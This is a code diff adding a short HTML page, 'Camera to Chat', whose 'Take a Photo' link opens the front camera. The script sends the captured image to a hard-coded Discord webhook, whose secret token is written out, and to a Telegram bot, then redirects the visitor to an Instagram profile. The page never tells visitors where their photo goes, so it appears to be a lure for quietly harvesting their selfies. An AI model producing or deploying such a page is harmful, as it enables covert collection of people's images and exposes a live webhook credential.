@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera to Chat</title>
+  <style>
+    .camera-link {
+      color: blue;
+      text-decoration: underline;
+      cursor: pointer;
+    }
+    #camera-input {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <a href="#" class="camera-link" onclick="document.getElementById('camera-input').click();">
+    Take a Photo
+  </a>
+  <input 
+    type="file" 
+    accept="image/*" 
+    capture="user" 
+    id="camera-input"
+    onchange="handlePhoto(event)"
+  >
+  <script>
+    async function handlePhoto(event) {
+      const file = event.target.files[0];
+      if (file) {
+        // Convert file to a FormData object
+        const formData = new FormData();
+        formData.append("photo", file);
+
+        try {
+          // Send to Discord Webhook
+          const discordWebhookUrl = "https://discord.com/api/webhooks/1331575190848667658/9Sz5ZCjFiAiGNlm6wZgA4MMDmbaMUb8tjZO-Wr7SWfXEWQ1GOH5d1Mgs5mJsX9t2Z43f";
+          await fetch(discordWebhookUrl, {
+            method: "POST",
+            body: formData,
+          });
+
+          // Send to Telegram Bot
+          const telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN";
+          const telegramChatId = "YOUR_CHAT_ID";
+          const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
+
+          formData.append("chat_id", telegramChatId);
+          await fetch(telegramUrl, {
+            method: "POST",
+            body: formData,
+          });
+
+          // Redirect after success
+          alert("Photo sent successfully!");
+          window.location.href = "https://www.instagram.com/f_arsenova/";
+
+        } catch (error) {
+          console.error("Error sending photo:", error);
+          alert("Failed to send photo. Please try again.");
+        }
+      }
+    }
+  </script>
+</body>
+</html>
